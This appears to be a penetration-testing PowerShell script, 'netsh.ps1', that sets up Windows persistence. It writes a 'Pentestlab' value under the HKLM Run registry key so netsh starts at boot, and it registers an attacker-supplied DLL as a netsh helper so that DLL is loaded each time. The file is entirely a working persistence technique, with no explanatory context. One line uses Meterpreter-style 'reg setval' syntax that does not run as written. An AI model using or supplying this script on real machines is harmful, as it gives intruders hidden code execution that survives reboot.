 param (
    [string]$path = "NULL"
 )
 if($path -eq "NULL"){
    Write-Host "netsh.ps1 -path <DLL_path>";
    exit(0);
 }else{
    write-host "[*] reboot run netsh";
    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "C:\Windows\SysWOW64\netsh";
    reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v pentestlab -d 'C:\Windows\SysWOW64\netsh';
    netsh add helper $path;
}